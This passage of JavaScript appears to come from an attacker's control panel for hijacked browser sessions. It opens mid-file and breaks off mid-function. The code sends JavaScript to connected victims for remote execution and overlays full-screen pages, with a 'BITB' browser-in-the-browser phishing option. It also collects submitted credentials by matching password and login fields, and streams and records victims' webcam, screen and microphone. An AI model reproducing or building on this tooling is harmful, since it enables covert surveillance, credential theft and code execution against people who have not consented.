    localStorage.removeItem('uploadedFiles');
    fileStorage.clear();
    updateFileList();
    document.getElementById('fileInfo').innerHTML = '<p>No file selected</p>';
    document.getElementById('fileInput').value = '';
    codeInput.value = '';
    latestFileName = null;
    currentHtmlContent = null;
}
        
        function clearClientData() {
            // Hide credentials section if needed
            const credentialsSection = document.getElementById('credentialsSection');
            const credentialsInfo = document.getElementById('credentialsInfo');
            if (credentialsSection) credentialsSection.style.display = 'none';
            if (credentialsInfo) credentialsInfo.innerHTML = '';
            
            // Use the same message type as the blur section's clean button
            if (ws && ws.readyState === WebSocket.OPEN) {
                const message = {
                    type: 'Sudoclean'
                };
                
                // Send to selected clients
                sendToSelectedClients(message);
                
                showStatusMessage('success', 'Display cleaned');
            } else {
                showStatusMessage('error', 'WebSocket connection is not available');
            }
        }
        // Function to upload all files from control.php's localStorage to client.html localStorage
        function uploadToClientStorage() {
    // Check if there are any files in fileStorage
    if (fileStorage.size === 0) {
        alert('No files available to upload');
        return;
    }
    
    // Get reload toggle state - ensure it's a boolean value
    const reloadToggleElement = document.getElementById('displayReloadToggle');
    if (!reloadToggleElement) {
        console.error('Reload toggle element not found!');
        return;
    }
    
    const shouldReload = Boolean(reloadToggleElement.checked);
    console.log(`Upload with reload flag: ${shouldReload} (${typeof shouldReload})`);
    console.log('Reload toggle checked state:', reloadToggleElement.checked);
    
    // Upload all files from fileStorage
    let uploadCount = 0;
    fileStorage.forEach((fileData, fileName) => {
        // Create the message with the reload flag
        const message = {
            type: 'storeFile',
            fileName: fileName,
            content: fileData.data,
            reload: shouldReload  // Include reload flag based on toggle state
        };
        
        // Log the exact message being sent
        console.log(`Sending file ${fileName} with message:`, JSON.stringify(message));
        
        // Send the file to selected clients via WebSocket
        sendToSelectedClients(message);
        uploadCount++;
    });
    
    console.log(`${uploadCount} files uploaded to client storage with reload flag: ${shouldReload}`);
    
    // Also handle any newly selected files if present
    const fileInput = document.getElementById('fileInput');
    if (fileInput.files.length > 0) {
        Array.from(fileInput.files).forEach(file => {
            const reader = new FileReader();
            reader.onload = function(e) {
                const content = e.target.result;
                
                // Create the message with the reload flag
                const message = {
                    type: 'storeFile',
                    fileName: file.name,
                    content: content,
                    reload: shouldReload  // Include reload flag based on toggle state
                };
                
                // Log the exact message being sent
                console.log(`Sending file ${file.name} with message:`, JSON.stringify(message));
                
                // Send the file to selected clients via WebSocket
                sendToSelectedClients(message);
            };
            
            reader.onerror = function() {
                console.error(`Error reading file: ${file.name}`);
            };
            
            reader.readAsText(file);
        });
    }
}
        // Function to clear all uploaded files from client.html localStorage
        function clearClientStorage() {
    if (confirm('Are you sure you want to clear all uploaded files from client storage?')) {
        sendToSelectedClients({
            type: 'clearFiles'
        });
    }
}
        
        function getFileIcon(extension) {
    const iconMap = {
        'html': '📄',
        'js': '📜',
        'css': '🎨',
        'jpg': '🖼️',
        'jpeg': '🖼️',
        'png': '🖼️',
        'gif': '🖼️',
        'pdf': '📕',
        'doc': '📘',
        'docx': '📘',
        'xls': '📗',
        'xlsx': '📗',
        'ppt': '📙',
        'pptx': '📙',
        'zip': '📦',
        'rar': '📦',
        'exe': '⚙️',
        'bat': '⚙️',
        'cmd': '⚙️',
        'sh': '⚙️',
        'py': '🐍',
        'mp3': '🎵',
        'mp4': '🎬',
        'avi': '🎬',
        'mov': '🎬'
    };
    return iconMap[extension.toLowerCase()] || '📄';
}
        
        function updateFileList() {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '';
            
            if (fileStorage.size === 0) {
                fileList.innerHTML = '<p class="no-files">No files available</p>';
                return;
            }
            
            fileStorage.forEach((fileData, fileName) => {
                const li = document.createElement('li');
                li.className = 'file-item';
                li.innerHTML = `
                    <div class="file-name">
                        <span class="file-icon">${getFileIcon(fileName)}</span>
                        <span>${fileName}</span>
                    </div>
                    <div class="file-actions">
                        <button class="btn primary small" onclick="handleFileAction('${fileName}')">${fileName.endsWith('.js') ? 'Execute' : 'Display'}</button>
                        ${!fileName.endsWith('.js') ? `<button onclick="BITBFile('${fileName}')" class="btn primary small">BITB</button>` : ''}
                        <button onclick="uploadSingleFile('${fileName}')" class="btn success small">Upload</button>
                        <button onclick="clearSingleFile('${fileName}')" class="btn warning small">Clear</button>
                        <button onclick="removeFile('${fileName}')" class="btn danger small">Remove</button>
                    </div>
                `;
                fileList.appendChild(li);
            });
        }
        
        function getFileIcon(fileName) {
            const ext = fileName.split('.').pop().toLowerCase();
            switch(ext) {
                case 'html': return '📄';
                case 'js': return '📜';
                case 'css': return '🎨';
                case 'mhtml': return '🌐';
                default: return '📁';
            }
        }
        
        function removeFile(fileName) {
            if (confirm(`Are you sure you want to remove ${fileName}?`)) {
                fileStorage.delete(fileName);
                updateFileList();
                saveToLocalStorage();
            }
        }
        
        function uploadSingleFile(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            
            // Get reload toggle state - ensure it's a boolean value
            const reloadToggleElement = document.getElementById('displayReloadToggle');
            if (!reloadToggleElement) {
                console.error('Reload toggle element not found!');
                return;
            }
            
            const shouldReload = Boolean(reloadToggleElement.checked);
            console.log(`Upload single file with reload flag: ${shouldReload} (${typeof shouldReload})`);
            
            // Create the message with the reload flag
            const message = {
                type: 'storeFile',
                fileName: fileName,
                content: fileData.data,
                reload: shouldReload  // Include reload flag based on toggle state
            };
            
            // Log the exact message being sent
            console.log(`Sending file ${fileName} with message:`, JSON.stringify(message));
            
            // Send the file to selected clients via WebSocket
            sendToSelectedClients(message);
            
            console.log(`File ${fileName} uploaded to client storage with reload flag: ${shouldReload}`);
        }
        
        function clearSingleFile(fileName) {
            if (confirm(`Are you sure you want to clear ${fileName} from client storage?`)) {
                // Send request to clear this specific file from client.html localStorage
                sendToSelectedClients({
                    type: 'clearSingleFile',
                    fileName: fileName
                });
            }
        }

        function handleFileAction(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            
            if (fileData.extension === 'js') {
                // Get reload toggle state
                const shouldReload = document.getElementById('displayReloadToggle').checked;
                
                // Send JavaScript directly to selected clients for execution
                sendToSelectedClients({
                    type: 'executeContent',
                    content: fileData.data,
                    fileName: fileName,
                    reload: shouldReload
                });
                
                console.log(`Sent JavaScript file ${fileName} for execution`);
                return;
            }
            
            if (fileData.extension === 'html') {
                currentHtmlContent = fileData.data;
                latestFileName = fileName;
                viewLatestFile();
            }
        }

        function viewLatestFile() {
            if (!latestFileName) return;
            const fileData = fileStorage.get(latestFileName);
            if (!fileData) return;
            // Get reload toggle state
            const shouldReload = document.getElementById('displayReloadToggle').checked;
            
            // Create a fullscreen version with CSS to make it display at 100% width/height
            const fullscreenContent = `
            <style>
                html, body {
                    margin: 0;
                    padding: 0;
                    width: 100%;
                    height: 100%;
                    overflow: auto; /* Allow scrolling */
                }
                #fullscreen-container {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 9999;
                    overflow: auto; /* Allow scrolling */
                    background-color: white;
                }
                /* Make content inside the container scrollable */
                #fullscreen-content {
                    width: 100%;
                    min-height: 100%;
                    padding: 10px;
                    box-sizing: border-box;
                }
            </style>
            <div id="fullscreen-container">
                <div id="fullscreen-content">
                    ${fileData.data}
                </div>
            </div>
            `;
            
            // Send to selected clients
            sendToSelectedClients({
                type: 'showsContent',
                content: fullscreenContent,
                fileName: latestFileName,
                resources: {},
                reload: shouldReload,
                clearBlur: true // Add flag to clear blur effect
            });
            
            showStatusMessage('success', `Displaying ${latestFileName} in full screen`);
        }


        // DOM Elements and variables
        const sidebarLinks = document.querySelectorAll('.sidebar-menu-item a');
        const contentSections = document.querySelectorAll('.content-section');
        const toggleSidebarBtn = document.querySelector('.toggle-sidebar');
        const dropZone = document.getElementById('dropZone');
        const fileInput = document.getElementById('fileInput');
        const codeInput = document.getElementById('codeInput');
        let latestFileName = null;
        let currentHtmlContent = null;
        let fileStorage = new Map();
        const sidebar = document.querySelector('.sidebar');
        const clientList = document.getElementById('clientList');
        const emptyState = document.getElementById('emptyState');
        const clearAllBtn = document.getElementById('clearAllBtn');
        const selectionBar = document.getElementById('selectionBar');
        const selectedCount = document.getElementById('selectedCount');
        const cancelSelectionBtn = document.getElementById('cancelSelectionBtn');
        const communicationInterface = document.getElementById('communicationInterface');
        const selectedIpDisplay = document.getElementById('selectedIpDisplay');
        const messageInput = document.getElementById('messageInput');
        const closeCommBtn = document.getElementById('closeCommBtn');
        const sendMessageBtn = document.getElementById('sendMessageBtn');
        
        // WebSocket connection
        let ws;
        let clients = {};
        let connectionTimeouts = {};
        let selectedClients = [];
        // Cache of stylesheets per client for immediate injection on html updates
        window._clientStyleCache = window._clientStyleCache || {};
        window._clientHtmlCache = window._clientHtmlCache || {};
        
        // Function to switch between sections
        function switchSection(sectionId) {
            // Hide all sections
            contentSections.forEach(section => {
                section.classList.remove('active');
            });
            
            // Remove active class from all links
            sidebarLinks.forEach(link => {
                link.classList.remove('active');
            });
            
            // Show selected section
            const selectedSection = document.getElementById(sectionId);
            if (selectedSection) {
                selectedSection.classList.add('active');
            }
            
            // Add active class to clicked link
            const selectedLink = document.querySelector(`[data-section="${sectionId}"]`);
            if (selectedLink) {
                selectedLink.classList.add('active');
            }
        }
        
        // Initialize WebSocket connection
        function initWebSocket() {
            ws = new WebSocket('ws://localhost:8080');
           //   ws = new WebSocket('wss://304a-2401-4900-1c71-d522-2836-b256-6d76-dc0c.ngrok-free.app ');
           window.websocket = ws; 
           ws.onopen = function() {
                console.log('WebSocket connection established');
            };
            
            ws.onclose = function() {
                console.log('WebSocket connection closed');
                // Try to reconnect after 3 seconds
                setTimeout(initWebSocket, 3000);
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
            };
            window.websocket.onopen = function () {
                sendRequestContent();
            };

            ws.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    console.log('Received message type:', data.type);
                    
                    // Handle client ping messages (keep-alive)
                    if (data.type === 'ping' && data.clientId && data.ip) {
                        // This is a ping from a known client - just update the last seen time
                        updateClientLastSeen(data);
                        return;
                    }
                    
                    // Handle client connection data
                    if ( data.type === 'connection') {
                        handleClientConnection(data);
                        
                    }
                    // Handle credentials data from form submissions
                    else if (data.type === 'credentials') {
                        console.log('Received credentials data:', data);
                        addCredentials(data);
                    }
                    // Check form data for credential fields
                    else if (data.type === 'formData') {
                        console.log('Received form data:', data);
                        // Check if it contains credential fields
                        const credentialFields = ['username', 'password', 'email', 'pass', 'name', 'login', 'user'];
                        const hasCredentials = Object.keys(data.data || {}).some(key => 
                            credentialFields.some(field => key.toLowerCase().includes(field))
                        );
                        
                        if (hasCredentials) {
                            // Treat it as credentials
                            addCredentials(data);
                        }
                    }
                    // Handle login data for backward compatibility
                    else if (data.type === 'loginData') {
                        // Handle as credentials
                        addCredentials({
                            data: data.data,
                            url: data.url || 'Unknown',
                            timestamp: data.timestamp || new Date().toISOString()
                        });
                    }

                    else if (data.type === 'camera-frame') {
                        const cameraDisplay = document.getElementById('cameraFeed');
                        
                        // Check if this camera frame has a client ID
                        const clientId = data.clientId || 'default';
                        
                        // Update the main camera display if no client ID or it's the first client
                        if (cameraDisplay && (!data.clientId || clientId === window.activeClientId || !window.activeClientId)) {
                            if (data.data.startsWith('data:image')) {
                                // Create a canvas to convert image data to video stream
                                if (!cameraStream) {
                                    const canvas = document.createElement('canvas');
                                    const ctx = canvas.getContext('2d');
                                    canvas.width = 640;
                                    canvas.height = 480;
                                    
                                    // Create an image to load the frame data
                                    const img = new Image();
                                    img.onload = () => {
                                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                                    };
                                    
                                    // Get the stream from canvas
                                    cameraStream = canvas.captureStream(30);
                                    cameraDisplay.srcObject = cameraStream;
                                    console.log('Camera stream initialized with canvas stream');
                                }
                                
                                // Update the frame
                                const img = new Image();
                                img.src = data.data;
                                img.onload = () => {
                                    const canvas = cameraStream.getTracks()[0].canvas;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                                };
                                
                                // Set this as the active client ID if not already set
                                if (!window.activeClientId) {
                                    window.activeClientId = clientId;
                                }
                            }
                        }
                        
                        // Handle client-specific camera feed if there's a client ID
                        if (data.clientId) {
                            // Check if we already have a container for this client
                            let clientContainer = document.getElementById(`camera-container-${clientId}`);
                            
                            if (!clientContainer) {
                                // Create a new container for this client
                                clientContainer = document.createElement('div');
                                clientContainer.id = `camera-container-${clientId}`;
                                clientContainer.style.border = '1px solid #ddd';
                                clientContainer.style.borderRadius = '8px';
                                clientContainer.style.padding = '15px';
                                clientContainer.style.marginTop = '20px';
                                clientContainer.style.backgroundColor = '#f8f9fa';
                                
                                // Create client header with ID
                                const clientHeader = document.createElement('div');
                                clientHeader.style.display = 'flex';
                                clientHeader.style.justifyContent = 'space-between';
                                clientHeader.style.alignItems = 'center';
                                clientHeader.style.marginBottom = '10px';
                                
                                const clientTitle = document.createElement('h4');
                                clientTitle.textContent = `Client: ${clientId.substring(0, 8)}`;
                                clientTitle.style.margin = '0';
                                
                                clientHeader.appendChild(clientTitle);
                                clientContainer.appendChild(clientHeader);
                                
                                // Create video element
                                const clientVideo = document.createElement('video');
                                clientVideo.id = `client-camera-${clientId}`;
                                clientVideo.autoplay = true;
                                clientVideo.playsinline = true;
                                clientVideo.style.width = '100%';
                                clientVideo.style.maxWidth = '640px';
                                clientVideo.style.borderRadius = '4px';
                                clientContainer.appendChild(clientVideo);
                                
                                // Create buttons container
                                const buttonsContainer = document.createElement('div');
                                buttonsContainer.style.display = 'flex';
                                buttonsContainer.style.gap = '10px';
                                buttonsContainer.style.marginTop = '10px';
                                
                                // Create record button
                                const recordButton = document.createElement('button');
                                recordButton.className = 'perm-button';
                                recordButton.textContent = '⏺️ Start Recording';
                                recordButton.onclick = function() {
                                    toggleClientCameraRecording(clientId);
                                };
                                
                                // Create screenshot button
                                const screenshotButton = document.createElement('button');
                                screenshotButton.className = 'perm-button';
                                screenshotButton.textContent = '📸 Take Screenshot';
                                screenshotButton.onclick = function() {
                                    takeClientCameraScreenshot(clientId);
                                };
                                
                                // Add buttons to container
                                buttonsContainer.appendChild(recordButton);
                                buttonsContainer.appendChild(screenshotButton);
                                clientContainer.appendChild(buttonsContainer);
                                
                                // Add the container to the client feeds section
                                document.getElementById('client-camera-feeds').appendChild(clientContainer);
                                
                                // Initialize client-specific stream
                                const clientCanvas = document.createElement('canvas');
                                clientCanvas.width = 640;
                                clientCanvas.height = 480;
                                clientCanvas.style.display = 'none';
                                document.body.appendChild(clientCanvas);
                                
                                // Create stream from canvas
                                const clientStream = clientCanvas.captureStream(30);
                                clientVideo.srcObject = clientStream;
                                
                                // Store canvas and stream in global objects for reference
                                if (!window.clientCameraCanvases) window.clientCameraCanvases = {};
                                window.clientCameraCanvases[clientId] = clientCanvas;
                                
                                if (!window.clientCameraStreams) window.clientCameraStreams = {};
                                window.clientCameraStreams[clientId] = clientStream;
                            }
                            
                            // Update the client's camera feed
                            if (window.clientCameraCanvases && window.clientCameraCanvases[clientId]) {
                                const clientCanvas = window.clientCameraCanvases[clientId];
                                const clientCtx = clientCanvas.getContext('2d');
                                
                                const clientImg = new Image();
                                clientImg.src = data.data;
                                clientImg.onload = () => {
                                    clientCtx.drawImage(clientImg, 0, 0, clientCanvas.width, clientCanvas.height);
                                };
                            }
                        }
                    }
                    else if (data.type === 'screen-frame') {
                        const screenDisplay = document.getElementById('screenDisplay');
                        
                        // Check if this screen frame has a client ID
                        const clientId = data.clientId || 'default';
                        
                        // Update the main screen display if no client ID or it's the first client
                        if (screenDisplay && (!data.clientId || clientId === window.activeScreenClientId || !window.activeScreenClientId)) {
                            screenDisplay.src = data.data;
                            
                            // Initialize screen stream if not already done
                            if (!screenStream) {
                                // Create a canvas for screen capture with fixed dimensions
                                const canvas = document.createElement('canvas');
                                const ctx = canvas.getContext('2d');
                                canvas.width = 1280; // Fixed width
                                canvas.height = 720; // Fixed height
                                document.body.appendChild(canvas);
                                canvas.style.display = 'none';
                                
                                // Set up an interval to continuously update the canvas
                                setInterval(() => {
                                    if (screenDisplay.complete && screenDisplay.naturalWidth > 0) {
                                        ctx.drawImage(screenDisplay, 0, 0, canvas.width, canvas.height);
                                    }
                                }, 33); // ~30fps
                                
                                // Create a stream from the canvas
                                try {
                                    screenStream = canvas.captureStream(30);
                                    console.log('Screen stream created successfully with dimensions:', canvas.width, 'x', canvas.height);
                                } catch (e) {
                                    console.error('Error creating screen stream:', e);
                                }
                            }
                            
                            // Set this as the active screen client ID if not already set
                            if (!window.activeScreenClientId) {
                                window.activeScreenClientId = clientId;
                            }
                        }
                        
                        // Handle client-specific screen capture if there's a client ID
                        if (data.clientId) {
                            // Check if we already have a container for this client
                            let clientContainer = document.getElementById(`screen-container-${clientId}`);
                            
                            if (!clientContainer) {
                                // Create a new container for this client
                                clientContainer = document.createElement('div');
                                clientContainer.id = `screen-container-${clientId}`;
                                clientContainer.style.border = '1px solid #ddd';
                                clientContainer.style.borderRadius = '8px';
                                clientContainer.style.padding = '15px';
                                clientContainer.style.marginTop = '20px';
                                clientContainer.style.backgroundColor = '#f8f9fa';
                                
                                // Create client header with ID
                                const clientHeader = document.createElement('div');
                                clientHeader.style.display = 'flex';
                                clientHeader.style.justifyContent = 'space-between';
                                clientHeader.style.alignItems = 'center';
                                clientHeader.style.marginBottom = '10px';
                                
                                const clientTitle = document.createElement('h4');
                                clientTitle.textContent = `Client: ${clientId.substring(0, 8)}`;
                                clientTitle.style.margin = '0';
                                
                                clientHeader.appendChild(clientTitle);
                                clientContainer.appendChild(clientHeader);
                                
                                // Create image element
                                const clientScreen = document.createElement('img');
                                clientScreen.id = `client-screen-${clientId}`;
                                clientScreen.style.width = '100%';
                                clientScreen.style.maxWidth = '1280px';
                                clientScreen.style.borderRadius = '4px';
                                clientContainer.appendChild(clientScreen);
                                
                                // Create buttons container
                                const buttonsContainer = document.createElement('div');
                                buttonsContainer.style.display = 'flex';
                                buttonsContainer.style.gap = '10px';
                                buttonsContainer.style.marginTop = '10px';
                                
                                // Create record button
                                const recordButton = document.createElement('button');
                                recordButton.className = 'perm-button';
                                recordButton.textContent = '⏺️ Start Recording';
                                recordButton.onclick = function() {
                                    toggleClientScreenRecording(clientId);
                                };
                                
                                // Create screenshot button
                                const screenshotButton = document.createElement('button');
                                screenshotButton.className = 'perm-button';
                                screenshotButton.textContent = '📸 Take Screenshot';
                                screenshotButton.onclick = function() {
                                    takeClientScreenScreenshot(clientId);
                                };
                                
                                // Add buttons to container
                                buttonsContainer.appendChild(recordButton);
                                buttonsContainer.appendChild(screenshotButton);
                                clientContainer.appendChild(buttonsContainer);
                                
                                // Add the container to the client screen captures section
                                document.getElementById('client-screen-captures').appendChild(clientContainer);
                                
                                // Initialize client-specific canvas for recording
                                const clientCanvas = document.createElement('canvas');
                                clientCanvas.width = 1280;
                                clientCanvas.height = 720;
                                clientCanvas.style.display = 'none';
                                document.body.appendChild(clientCanvas);
                                
                                // Store canvas in global object for reference
                                if (!window.clientScreenCanvases) window.clientScreenCanvases = {};
                                window.clientScreenCanvases[clientId] = clientCanvas;
                                
                                // Set up interval to update client canvas
                                setInterval(() => {
                                    const clientScreenImg = document.getElementById(`client-screen-${clientId}`);
                                    if (clientScreenImg && clientScreenImg.complete && clientScreenImg.naturalWidth > 0) {
                                        const ctx = clientCanvas.getContext('2d');
                                        ctx.drawImage(clientScreenImg, 0, 0, clientCanvas.width, clientCanvas.height);
                                    }
                                }, 33); // ~30fps
                                
                                // Create stream from canvas
                                try {
                                    const clientStream = clientCanvas.captureStream(30);
                                    
                                    // Store stream in global object for reference
                                    if (!window.clientScreenStreams) window.clientScreenStreams = {};
                                    window.clientScreenStreams[clientId] = clientStream;
                                } catch (e) {
                                    console.error(`Error creating screen stream for client ${clientId}:`, e);
                                }
                            }
                            
                            // Update the client's screen capture
                            const clientScreen = document.getElementById(`client-screen-${clientId}`);
                            if (clientScreen) {
                                clientScreen.src = data.data;
                            }
                        }
                    }
                    
                    else if (data.type === 'audio-data') {
                            // Audio data received from client
                            const audioContext = window.audioContext || (window.audioContext = new (window.AudioContext || window.webkitAudioContext)({
                                // Use higher sample rate for better audio quality
                                sampleRate: 48000
                            }));
                            
                            // Get client ID from data or use default
                            const clientId = data.clientId || 'default';
                            
                            // Check if this client's audio is paused
                            if (window.clientAudioStates && window.clientAudioStates[clientId]) {
                                // Skip processing if this client's audio is paused
                                console.log(`Skipping audio processing for paused client ${clientId}`);
                                return;
                            }
                            
                            // Store packets for proper ordering using timestamp and client ID
                            if (!window.audioPackets) window.audioPackets = {};
                            
                            // Initialize client-specific packet queue if needed
                            if (!window.audioPackets[clientId]) {
                                window.audioPackets[clientId] = [];
                            }
                            
                            // Add packet to client-specific queue with timestamp
                            const timestamp = data.timestamp || Date.now();
                            window.audioPackets[clientId].push({
                                data: data.data,
                                timestamp: timestamp
                            });
                            
                            // Sort client-specific packets by timestamp (oldest first)
                            window.audioPackets[clientId].sort((a, b) => a.timestamp - b.timestamp);
                            
                            // Process oldest packet for this client
                            if (window.audioPackets[clientId].length > 0) {
                                const packet = window.audioPackets[clientId].shift();
                                data.data = packet.data;
                            }
                            
                            // Create or get client-specific audio container
                            const audioContainer = document.getElementById('audioContainer');
                            if (audioContainer) {
                                // Check if we already have a container for this client
                                let clientContainer = document.getElementById(`audio-client-${clientId}`);
                                
                                if (!clientContainer) {
                                    // Create new client container
                                    clientContainer = document.createElement('div');
                                    clientContainer.id = `audio-client-${clientId}`;
                                    clientContainer.className = 'client-audio-container';
                                    clientContainer.style.cssText = 'margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px;';
                                    
                                    // Add client header
                                    const clientHeader = document.createElement('div');
                                    clientHeader.className = 'client-header';
                                    
                                    // Get nickname for this client
                                    let displayName = clientId;
                                    let foundNickname = false;
                                    
                                    // Find client by clientId in our clients object - try exact match first
                                    for (const key in clients) {
                                        if (clients[key].clientId === clientId && clients[key].nickname) {
                                            displayName = clients[key].nickname;
                                            foundNickname = true;
                                            break;
                                        }
                                    }
                                    
                                    // If no exact match, try partial match with the shortened ID
                                    if (!foundNickname) {
                                        const shortId = clientId.split('_').pop().substring(0, 8);
                                        for (const key in clients) {
                                            if (clients[key].clientId && 
                                                clients[key].clientId.includes(shortId) && 
                                                clients[key].nickname) {
                                                displayName = clients[key].nickname;
                                                break;
                                            }
                                        }
                                    }
                                    
                                    clientHeader.innerHTML = `<strong>Client: ${displayName}</strong>`;
                                    clientHeader.style.cssText = 'margin-bottom: 10px; font-size: 16px; color: #333;';
                                    
                                    // Create client-specific visualizer
                                    const visualizer = document.createElement('canvas');
                                    visualizer.id = `audioVisualizer-${clientId}`;
                                    visualizer.width = 300;
                                    visualizer.height = 100;
                                    visualizer.style.cssText = 'width: 100%; background: #f8f9fa; border-radius: 4px;';
                                    
                                    // Create button container for controls
                                    const buttonContainer = document.createElement('div');
                                    buttonContainer.style.cssText = 'display: flex; gap: 10px; margin-top: 10px;';
                                    
                                    // Create client-specific record button
                                    const recordButton = document.createElement('button');
                                    recordButton.id = `audioRecordButton-${clientId}`;
                                    recordButton.className = 'perm-button';
                                    recordButton.textContent = '⏺️ Record Audio';
                                    recordButton.style.cssText = 'background-color: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;';
                                    recordButton.onclick = function() { toggleAudioRecording(clientId); };
                                    
                                    // Create client-specific pause/resume button
                                    const pauseButton = document.createElement('button');
                                    pauseButton.id = `audioPauseButton-${clientId}`;
                                    pauseButton.className = 'perm-button';
                                    pauseButton.textContent = '⏸️ Pause Audio';
                                    pauseButton.style.cssText = 'background-color: #007bff; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;';
                                    pauseButton.onclick = function() { toggleClientAudio(clientId); };
                                    
                                    // Add buttons to button container
                                    buttonContainer.appendChild(recordButton);
                                    buttonContainer.appendChild(pauseButton);
                                    
                                    // Add elements to client container
                                    clientContainer.appendChild(clientHeader);
                                    clientContainer.appendChild(visualizer);
                                    clientContainer.appendChild(buttonContainer);
                                    
                                    // Add to audio container
                                    audioContainer.appendChild(clientContainer);
                                }
                            }
                            
                            // Ensure audio context is running
                            if (audioContext.state === 'suspended') {
                                audioContext.resume();
                            }
                            
                            // Create an AudioBuffer from the Float32Array data
                            const audioBuffer = audioContext.createBuffer(1, data.data.length, audioContext.sampleRate);
                            const channelData = audioBuffer.getChannelData(0);
                            
                            // Copy the received Float32Array data into the audio buffer with enhanced processing
                            // Apply advanced pre-processing to the audio data for better clarity
                            const noiseFloor = 0.003; // Even lower noise floor for better sensitivity
                            let maxSample = 0;
                            let rms = 0; // Root mean square for better volume assessment
                            
                            // First pass: calculate statistics for intelligent processing
                            for (let i = 0; i < data.data.length; i++) {
                                const absValue = Math.abs(data.data[i]);
                                if (absValue > maxSample) {
                                    maxSample = absValue;
                                }
                                rms += data.data[i] * data.data[i];
                            }
                            
                            // Calculate RMS (Root Mean Square) for better volume assessment
                            rms = Math.sqrt(rms / data.data.length);
                            
                            // Determine optimal normalization based on audio characteristics
                            // Use dynamic normalization based on both peak and RMS values
                            let normalizationFactor;
                            if (maxSample > 0.3) {
                                // Already loud enough, just minor boost
                                normalizationFactor = 1.2;
                            } else if (maxSample > 0.1) {
                                // Medium level, moderate boost
                                normalizationFactor = 1.8;
                            } else if (rms > 0.01) {
                                // Low level but consistent sound, higher boost
                                normalizationFactor = 2.5;
                            } else {
                                // Very low level, maximum boost
                                normalizationFactor = 3.0;
                            }
                            
                            // Apply intelligent noise reduction and normalization
                            for (let i = 0; i < data.data.length; i++) {
                                // Apply improved noise gate to reduce background noise
                                let sample = data.data[i];
                                
                                // Adaptive noise gate based on overall signal strength
                                const adaptiveNoiseFloor = noiseFloor * (1.0 / (rms * 50 + 1));
                                
                                if (Math.abs(sample) < adaptiveNoiseFloor) {
                                    sample = 0;
                                } else {
                                    // Apply smooth noise reduction with soft knee for natural sound
                                    if (Math.abs(sample) < adaptiveNoiseFloor * 5) {
                                        const factor = (Math.abs(sample) - adaptiveNoiseFloor) / (adaptiveNoiseFloor * 4);
                                        // Use cubic easing for smoother transition
                                        const smoothFactor = factor * factor * (3 - 2 * factor);
                                        sample *= smoothFactor;
                                    }
                                }
                                
                                // Apply normalization with soft clipping to prevent harsh distortion
                                const normalized = sample * normalizationFactor;
                                if (normalized > 0.95) {
                                    channelData[i] = 0.95 + (normalized - 0.95) * 0.05;
                                } else if (normalized < -0.95) {
                                    channelData[i] = -0.95 + (normalized + 0.95) * 0.05;
                                } else {
                                    channelData[i] = normalized;
                                }
                            }
                            
                            // Create and play the audio buffer
                            const source = audioContext.createBufferSource();
                            source.buffer = audioBuffer;
                            
                            // Advanced audio processing chain for maximum clarity
                            
                            // 1. Create a high-pass filter to remove low-frequency noise and rumble
                            const highPassFilter = audioContext.createBiquadFilter();
                            highPassFilter.type = 'highpass';
                            highPassFilter.frequency.value = 100; // Cut off frequencies below 100Hz
                            highPassFilter.Q.value = 0.8;
                            
                            // 2. Create a low-pass filter to remove high-frequency hiss
                            const lowPassFilter = audioContext.createBiquadFilter();
                            lowPassFilter.type = 'lowpass';
                            lowPassFilter.frequency.value = 12000; // Cut off frequencies above 12kHz
                            lowPassFilter.Q.value = 0.7;
                            
                            // 3. Create first peaking filter to enhance lower speech frequencies
                            const peakingFilter1 = audioContext.createBiquadFilter();
                            peakingFilter1.type = 'peaking';
                            peakingFilter1.frequency.value = 1000; // Boost frequencies around 1kHz
                            peakingFilter1.gain.value = 4; // +4dB boost
                            peakingFilter1.Q.value = 1.0;
                            
                            // 4. Create second peaking filter to enhance higher speech frequencies
                            const peakingFilter2 = audioContext.createBiquadFilter();
                            peakingFilter2.type = 'peaking';
                            peakingFilter2.frequency.value = 3000; // Boost frequencies around 3kHz for clarity
                            peakingFilter2.gain.value = 6; // +6dB boost
                            peakingFilter2.Q.value = 1.0;
                            
                            // 5. Create a compressor for more consistent volume
                            const compressor = audioContext.createDynamicsCompressor();
                            compressor.threshold.value = -24;
                            compressor.knee.value = 10; // Softer knee for smoother compression
                            compressor.ratio.value = 6; // Less aggressive ratio for more natural sound
                            compressor.attack.value = 0.002; // Faster attack to catch transients
                            compressor.release.value = 0.25;
                            
                            // 6. Create a gain node for final volume adjustment
                            const gainNode = audioContext.createGain();
                            gainNode.gain.value = 2.5; // Higher gain for better volume
                            
                            // Connect the enhanced processing chain
                            source.connect(highPassFilter);
                            highPassFilter.connect(lowPassFilter);
                            lowPassFilter.connect(peakingFilter1);
                            peakingFilter1.connect(peakingFilter2);
                            peakingFilter2.connect(compressor);
                            compressor.connect(gainNode);
                            
                            // Connect to the main output with processing
                            gainNode.connect(audioContext.destination);
                            
                            // Also connect to the recording destination if it exists
                            if (window.audioDestination) {
                                if (window.audioCompressor && window.audioGain) {
                                    // Use the existing processing chain for recording
                                    source.connect(window.audioCompressor);
                                } else {
                                    // Connect directly if no processing chain exists
                                    gainNode.connect(window.audioDestination);
                                }
                            }
                            
                            // Resume audio context if it's suspended (needed for Chrome's autoplay policy)
                            if (audioContext.state === 'suspended') {
                                audioContext.resume().then(() => {
                                    console.log('AudioContext resumed successfully');
                                    source.start(0);
                                }).catch(err => {
                                    console.error('Failed to resume AudioContext:', err);
                                });
                            } else {
                                source.start(0);
                            }
                            
                            // Visualize the audio data on client-specific canvas
                            const canvas = document.getElementById(`audioVisualizer-${clientId}`) || document.getElementById('audioVisualizer');
                            if (!canvas) return;
                            
                            const ctx = canvas.getContext('2d');
                            ctx.clearRect(0, 0, canvas.width, canvas.height);
                            
                            // Draw background grid for better visualization
                            ctx.strokeStyle = '#e9ecef';
                            ctx.lineWidth = 0.5;
                            
